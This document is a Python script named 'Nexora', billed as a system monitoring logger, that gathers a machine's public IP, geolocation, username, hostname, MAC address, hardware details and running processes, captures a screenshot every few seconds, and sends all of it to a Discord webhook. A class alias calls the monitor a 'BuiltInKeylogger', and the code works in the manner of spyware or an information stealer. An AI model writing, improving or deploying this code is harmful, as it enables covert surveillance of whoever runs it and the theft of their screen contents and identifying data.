#!/usr/bin/env python3
"""
Nexora - Advanced System Monitoring and Activity Logger
Refactored & Hardened for Multiplatform Security & Reliability
"""

import sys
import os
import io
import time
import json
import uuid
import socket
import locale
import signal
import platform
import getpass
import requests
import psutil
import threading
import tempfile
import traceback
from colorama import init, Fore, Style
from PIL import Image

init(autoreset=True)

# === DÉTECTION DE L'OS ===
def detect_os():
    """Detects the operating system"""
    sys_name = platform.system().lower()
    if 'windows' in sys_name:
        return 'windows'
    elif 'darwin' in sys_name:
        return 'macos'
    else:
        return 'linux'

CURRENT_OS = detect_os()

# === GESTION DE LA CONFIGURATION (SÉCURISÉE) ===
def load_configuration(exit_on_missing=True):
    """
    Loads configuration safely from environment variables or local config.json.
    Prevents secret leakage and avoids hardcoded credentials.
    """
    config_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
    config = {
        "webhook_url": os.getenv("NEXORA_WEBHOOK", ""),
        "interval": 10,
        "username": "Nexora Logger",
        "message": "Nexora Tool - Monitoring Active"
    }

    if os.path.exists(config_file):
        try:
            with open(config_file, "r", encoding="utf-8") as f:
                loaded = json.load(f)
                config.update(loaded)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Warning: Failed to read config.json: {e}{Style.RESET_ALL}")

    # Fallback si toujours vide
    if not config.get("webhook_url"):
        if exit_on_missing:
            print(f"{Fore.RED}[-] Error: Discord Webhook URL is missing!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Please configure it by running 'python nexora.py' or setting the NEXORA_WEBHOOK environment variable.{Style.RESET_ALL}")
            sys.exit(1)
        return config

    # Validation basique de l'URL du webhook
    webhook = config["webhook_url"].strip()
    if not (webhook.startswith("https://discord.com/api/webhooks/") or webhook.startswith("https://discordapp.com/api/webhooks/")):
        print(f"{Fore.YELLOW}[!] Warning: The provided webhook does not appear to be a valid Discord webhook URL.{Style.RESET_ALL}")

    return config

# Chargement sans forcer le exit à l'import
CONFIG = load_configuration(exit_on_missing=False)
WEBHOOK = CONFIG.get("webhook_url", "")
INTERVAL = max(1, int(CONFIG.get("interval", 10)))
BOT_USERNAME = CONFIG.get("username", "Nexora Logger")
STATUS_MESSAGE = CONFIG.get("message", "Nexora Tool - Monitoring Active")


# Variable d'arrêt thread-safe
stop_event = threading.Event()

def signal_handler(sig, frame):
    """Gère l'interruption propre (Ctrl+C / SIGINT / SIGTERM)"""
    print(f"\n{Fore.YELLOW}[*] Stop signal received. Shutting down gracefully...{Style.RESET_ALL}")
    stop_event.set()

def send_error(msg):
    """Envoie un rapport d'erreur formaté au webhook Discord"""
    try:
        error_payload = {
            "username": f"{BOT_USERNAME} - Error Reporter",
            "embeds": [{
                "title": "❌ Nexora Error Report",
                "description": f"```{str(msg)[:4000]}```",
                "color": 0xFF0000
            }]
        }
        requests.post(WEBHOOK, json=error_payload, timeout=5)
    except Exception:
        pass

def get_battery_info():
    """Récupère l'état de la batterie en évitant les erreurs d'attributs"""
    try:
        battery = psutil.sensors_battery()
        if battery is not None and hasattr(battery, 'percent'):
            plugged = " (Branché)" if getattr(battery, 'power_plugged', False) else " (Batterie)"
            return f"{battery.percent}%{plugged}"
        return "N/A (Secteur/Fixe)"
    except Exception:
        return "N/A"

def get_mac_address():
    """Récupère l'adresse MAC de manière fiable"""
    try:
        mac = uuid.getnode()
        return ':'.join(['{:02x}'.format((mac >> ele) & 0xff) for ele in range(40, -1, -8)])
    except Exception:
        return "N/A"

def get_local_ip():
    """Récupère l'adresse IP locale réelle (évite 127.0.1.1 sur Linux)"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Ne crée pas de connexion réelle, détermine juste l'interface réseau par défaut
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
    except Exception:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

def get_system_details():
    """Collecte les détails du matériel et du système d'exploitation"""
    try:
        ram_size = psutil.virtual_memory().total // (1024**3)

        # Compatibilité multiplateforme pour le disque racine
        if CURRENT_OS == 'windows':
            root_drive = os.path.splitdrive(os.getcwd())[0] or "C:"
            root_drive = root_drive + "\\"
        else:
            root_drive = "/"

        try:
            disk_size = psutil.disk_usage(root_drive).total // (1024**3)
        except Exception:
            disk_size = "N/A"

        # Gestion sécurisée de la locale
        try:
            loc = locale.getlocale()[0]
            loc_str = str(loc) if loc else "N/A"
        except Exception:
            loc_str = "N/A"

        # Température CPU (Linux uniquement en général)
        temp_cpu = "N/A"
        if hasattr(psutil, "sensors_temperatures"):
            try:
                temps = psutil.sensors_temperatures()
                if temps:
                    for name, entries in temps.items():
                        if entries:
                            temp_cpu = f"{entries[0].current}°C"
                            break
            except Exception:
                pass

        processor = platform.processor() or platform.machine() or "N/A"

        return {
            "🖥️ Processor": str(processor)[:100],
            "💾 RAM memory": f"{ram_size} Go",
            "💽 Disk space": f"{disk_size} Go" if disk_size != "N/A" else "N/A",
            "🔋 Battery": get_battery_info(),
            "🌐 System language": loc_str,
            "⏰ System time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "🔥 Température CPU": temp_cpu,
            "🎯 Operating System": CURRENT_OS.upper()
        }
    except Exception as e:
        return {"❌ Erreur system details": str(e)}

def get_ip_info():
    """Récupère l'adresse IP publique et les coordonnées de géolocalisation via HTTPS"""
    data = {}
    try:
        # Récupération de l'IP publique en HTTPS avec timeout
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        # Géolocalisation sécurisée
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if response.status_code == 200:
            data = response.json()
        else:
            # Fallback vers ip-api
            fallback = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if fallback.status_code == 200:
                data = fallback.json()
    except Exception as e:
        data = {}

    try:
        info = {
            "🧠 Public IP": data.get('query') or data.get('ip') or 'N/A',
            "🌍 country": data.get('country_name') or data.get('country') or 'N/A',
            "🏙️ City": data.get('city', 'N/A'),
            "📮 Zip code": data.get('postal') or data.get('zip') or 'N/A',
            "🕒 Time zone": data.get('timezone', 'N/A'),
            "📡 Internet Service Provider (ISP)": data.get('org') or data.get('isp') or 'N/A',
            "💻 Host name": socket.gethostname(),
            "👤 User": getpass.getuser(),
            "💼 Full name PC": platform.node(),
            "🔌 Local IP": get_local_ip(),
            "🧬 MAC address": get_mac_address(),
            "🖥️ System": f"{platform.system()} {platform.release()}",
            "🧱 Architecture": platform.machine(),
            "🐍 Python version": platform.python_version(),
            **get_system_details()
        }
    except Exception as e:
        send_error(f"Error while collecting system information: {traceback.format_exc()}")
        return None

    return info

def take_screenshot():
    """Capture d'écran sécurisée et multiplateforme avec chargement immédiat en mémoire"""
    try:
        if CURRENT_OS in ('windows', 'macos'):
            # Sur macOS et Windows, PIL ImageGrab utilise nativement Quartz/CoreGraphics et GDI
            from PIL import ImageGrab
            try:
                return ImageGrab.grab()
            except Exception as grab_err:
                if CURRENT_OS == 'macos':
                    # Fallback gracieux vers screencapture si nécessaire
                    import tempfile
                    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
                        temp_path = tmp_file.name
                    try:
                        res = subprocess.run(['screencapture', '-x', temp_path], check=False, capture_output=True)
                        if res.returncode == 0 and os.path.exists(temp_path):
                            with Image.open(temp_path) as img:
                                return img.copy()
                        else:
                            err_msg = res.stderr.decode(errors='ignore').strip() or "Permission Enregistrement d'écran manquante"
                            send_error(f"macOS Screenshot permission issue: {err_msg}")
                            return None
                    finally:
                        if os.path.exists(temp_path):
                            try:
                                os.remove(temp_path)
                            except OSError:
                                pass
                raise grab_err
        else:
            # Linux : Pillow ImageGrab nécessite X11 et scrot/xclip
            from PIL import ImageGrab
            try:
                return ImageGrab.grab()
            except OSError as os_err:
                # Échec typique sur Wayland ou en l'absence de scrot
                send_error(f"Linux screenshot failed (Wayland not supported or scrot missing): {os_err}")
                return None

    except Exception as e:
        send_error(f"Screenshot error ({CURRENT_OS}): {traceback.format_exc()}")
        return None


def send_screenshot():
    """Envoie une capture d'écran sur Discord avec respect des limites de débit (Rate Limit)"""
    screenshot = take_screenshot()
    if not screenshot:
        return

    screenshot_bytes = None
    try:
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        response = requests.post(
            WEBHOOK,
            files={'file': ('screenshot.png', screenshot_bytes.getvalue(), 'image/png')},
            data={'username': BOT_USERNAME, 'content': STATUS_MESSAGE},
            timeout=15
        )

        # Gestion dynamique du Rate Limiting Discord (HTTP 429)
        if response.status_code == 429:
            retry_after = 5
            try:
                retry_after = float(response.json().get('retry_after', 5))
            except Exception:
                pass
            print(f"{Fore.YELLOW}[!] Rate limited by Discord. Waiting {retry_after}s...{Style.RESET_ALL}")
            stop_event.wait(timeout=min(retry_after, 60))

    except requests.exceptions.Timeout:
        print(f"{Fore.YELLOW}[!] Screenshot upload timed out.{Style.RESET_ALL}")
    except Exception as e:
        send_error(f"Erreur screenshot : {traceback.format_exc()}")
    finally:
        if screenshot_bytes:
            screenshot_bytes.close()

# === MONITEUR D'ACTIVITÉ SYSTÈME (SÉCURISÉ ET THREAD-SAFE) ===
class ActivityMonitor:
    def __init__(self, webhook_url):
        self.buffer = ""
        self.timer = 0
        self.running = True
        self.webhook = webhook_url
        self.last_activity = time.time()
        self.activity_count = 0
        self.lock = threading.Lock()

        # Compteurs différentiels pour le disque
        self.last_disk_read = 0
        self.last_disk_write = 0
        try:
            io_counters = psutil.disk_io_counters()
            if io_counters:
                self.last_disk_read = io_counters.read_count
                self.last_disk_write = io_counters.write_count
        except Exception:
            pass

        # Initialisation non bloquante du CPU
        try:
            psutil.cpu_percent(interval=None)
        except Exception:
            pass

    def start_monitoring(self):
        """Démarre la boucle de surveillance en arrière-plan"""
        print(f"{Fore.CYAN}[+] Activity monitoring started.{Style.RESET_ALL}")

        while self.running and not stop_event.is_set():
            try:
                self._monitor_processes()
                self._monitor_system_activity()
                self._time_based_sampling()
            except Exception as e:
                pass

            # Attente de 10 secondes réactive à l'arrêt
            stop_event.wait(timeout=10)

    def _monitor_processes(self):
        """Surveillance robuste des processus utilisateurs (évite les TypeError sur None)"""
        try:
            user_processes = []
            current_user = getpass.getuser()

            for proc in psutil.process_iter(['name', 'username']):
                try:
                    p_user = proc.info.get('username')
                    p_name = proc.info.get('name')
                    # Filtrage strict contre None
                    if p_user == current_user and p_name:
                        user_processes.append(str(p_name))
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            if len(user_processes) > 2:
                # Dé-duplication et limitation
                unique_procs = list(dict.fromkeys(user_processes))[:5]
                self._log_activity(f"PROCESS_ACTIVITY: {','.join(unique_procs)}")
        except Exception:
            pass

    def _monitor_system_activity(self):
        """Surveillance différentielle du système sans bloquer le thread"""
        try:
            # Mesure CPU non-bloquante
            cpu_percent = psutil.cpu_percent(interval=None)
            if cpu_percent > 30:
                self._log_activity(f"CPU_USAGE: {cpu_percent}%")

            # Mémoire
            memory = psutil.virtual_memory()
            if memory.percent > 85:
                self._log_activity(f"HIGH_MEMORY: {memory.percent}%")

            # Surveillance différentielle du disque (évite les faux positifs permanents)
            disk = psutil.disk_io_counters()
            if disk:
                if disk.read_count > (self.last_disk_read + 50) or disk.write_count > (self.last_disk_write + 50):
                    self._log_activity("DISK_ACTIVITY")
                self.last_disk_read = disk.read_count
                self.last_disk_write = disk.write_count
        except Exception:
            pass

    def _time_based_sampling(self):
        """Échantillonnage régulier de statut"""
        current_time = time.time()
        if current_time - self.last_activity > 300:
            self.activity_count += 1
            sample_content = (
                f"**Activity Sample #{self.activity_count}**\n"
                f"```System active - {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"User: {getpass.getuser()}\n"
                f"Host: {platform.node()}```"
            )
            self._send_to_discord(sample_content)
            self.last_activity = current_time

    def _log_activity(self, activity_type):
        """Enregistre un événement avec synchronisation thread-safe"""
        with self.lock:
            self.timer += 1
            self.buffer += f"[{activity_type}] "
            if self.timer >= 10:
                self._flush_buffer_locked()

    def _flush_buffer_locked(self):
        """Vide le buffer vers Discord (doit être appelé avec self.lock acquis)"""
        if self.buffer.strip():
            msg = f"**System Activity Log:**\n```{self.buffer[:1900]}```"
            self.buffer = ""
            self.timer = 0
            # Envoi asynchrone pour ne pas bloquer le verrou
            threading.Thread(target=self._send_to_discord, args=(msg,), daemon=True).start()

    def _send_to_discord(self, content):
        """Envoi sécurisé d'un message vers Discord"""
        try:
            requests.post(self.webhook, json={
                "username": f"{BOT_USERNAME} - Activity Monitor",
                "content": content
            }, timeout=8)
        except Exception:
            pass

    def stop(self):
        """Arrête la surveillance et purge le buffer restant"""
        self.running = False
        with self.lock:
            if self.buffer.strip():
                try:
                    requests.post(self.webhook, json={
                        "username": f"{BOT_USERNAME} - Activity Monitor",
                        "content": f"**Final System Activity:**\n```{self.buffer[:1900]}```"
                    }, timeout=5)
                except Exception:
                    pass
                self.buffer = ""

# Alias pour compatibilité
BuiltInKeylogger = ActivityMonitor

def send_initial_system_info():
    """Formate et envoie les informations système en respectant la limite de 25 champs Discord"""
    system_info = get_ip_info()
    if not system_info:
        return

    fields = []
    for key, value in system_info.items():
        val_str = str(value).strip() if value is not None else "N/A"
        if not val_str:
            val_str = "N/A"
        fields.append({
            "name": str(key)[:256],
            "value": val_str[:1024],
            "inline": True
        })

    # Discord n'autorise STRICTEMENT que 25 champs par Embed maximum
    embed = {
        "title": "📡 Nexora System Information",
        "color": 0x3498db,
        "fields": fields[:25],
        "footer": {"text": f"Monitored by {BOT_USERNAME} | {time.strftime('%Y-%m-%d %H:%M:%S')}"}
    }

    try:
        requests.post(WEBHOOK, json={
            "username": BOT_USERNAME,
            "embeds": [embed]
        }, timeout=10)
        print(f"{Fore.GREEN}[+] System info embed sent to Discord.{Style.RESET_ALL}")
    except Exception as e:
        send_error(f"Error sending system info embed: {traceback.format_exc()}")

# === POINT D'ENTRÉE PRINCIPAL ===
def main():
    global CONFIG, WEBHOOK, INTERVAL, BOT_USERNAME, STATUS_MESSAGE
    CONFIG = load_configuration(exit_on_missing=True)
    WEBHOOK = CONFIG["webhook_url"]
    INTERVAL = max(1, int(CONFIG.get("interval", 10)))
    BOT_USERNAME = CONFIG.get("username", "Nexora Logger")
    STATUS_MESSAGE = CONFIG.get("message", "Nexora Tool - Monitoring Active")

    print(f"{Fore.CYAN}Nexora Logger starting on {CURRENT_OS.upper()}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Press Ctrl+C to stop cleanly.{Style.RESET_ALL}")

    # Enregistrement des signaux d'arrêt
    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, 'SIGTERM'):
        signal.signal(signal.SIGTERM, signal_handler)

    # 1. Envoi initial des métadonnées
    send_initial_system_info()

    # 2. Démarrage du moniteur d'activité en thread séparé
    activity_monitor = ActivityMonitor(WEBHOOK)
    monitor_thread = threading.Thread(target=activity_monitor.start_monitoring, daemon=True)
    monitor_thread.start()

    # 3. Boucle principale de capture d'écran sans surconsommation CPU
    last_screenshot_time = 0
    try:
        while not stop_event.is_set():
            current_time = time.time()
            if current_time - last_screenshot_time >= INTERVAL:
                send_screenshot()
                last_screenshot_time = time.time()

            # Attente réactive de 1 seconde (évite les boucles actives à 0.1s tout en réagissant vite)
            stop_event.wait(timeout=1.0)

    except KeyboardInterrupt:
        stop_event.set()
    except Exception as e:
        if not stop_event.is_set():
            send_error(f"Main loop error: {traceback.format_exc()}")

    # 4. Nettoyage final
    print(f"\n{Fore.GREEN}[*] Performing graceful shutdown...{Style.RESET_ALL}")
    activity_monitor.stop()

    try:
        requests.post(WEBHOOK, json={
            "username": BOT_USERNAME,
            "content": "🔴 **Nexora Logger stopped by the user**"
        }, timeout=5)
    except Exception:
        pass

    print(f"{Fore.GREEN}[+] Shutdown complete.{Style.RESET_ALL}")
    sys.exit(0)

if __name__ == "__main__":
    main()
